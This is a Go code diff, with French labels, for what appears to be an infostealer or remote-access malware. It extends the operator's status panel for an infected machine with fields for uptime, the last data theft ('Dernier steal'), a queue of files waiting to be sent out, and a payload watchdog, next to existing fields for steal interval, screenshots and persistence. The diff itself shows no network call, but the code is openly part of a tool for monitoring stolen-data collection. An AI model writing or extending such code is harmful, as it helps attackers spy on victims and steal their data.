@@ -107,6 +107,10 @@ func panelEmbed() map[string]any {
 		{"name": "Steal", "value": fmt.Sprintf("toutes les %d min", cfg.IntervalSteal), "inline": true},
 		{"name": "Captures", "value": fmt.Sprintf("x%d, 20 s", shotScaleValue()), "inline": true},
 		{"name": "Persistance", "value": persistStatus(), "inline": true},
+		{"name": "En ligne depuis", "value": bootTime(), "inline": true},
+		{"name": "Dernier steal", "value": lastStealLabel(), "inline": true},
+		{"name": "File d'envoi", "value": fmt.Sprintf("%d fichier(s)", queueCount()), "inline": true},
+		{"name": "Watchdog", "value": onOff(payloadAlive()), "inline": true},
 	}
 	return map[string]any{
 		"title":       "🖥️  " + hostname(),
@@ -115,4 +119,13 @@ func panelEmbed() map[string]any {
 		"fields":      fields,
 		"timestamp":   time.Now().Format(time.RFC3339),
 	}
+}
+
+// lastStealLabel rend l heure du dernier steal, ou « jamais ».
+func lastStealLabel() string {
+	v := lastStealAt.Load()
+	if v == 0 {
+		return "jamais"
+	}
+	return time.Unix(v, 0).Format("02/01 15:04")
 }
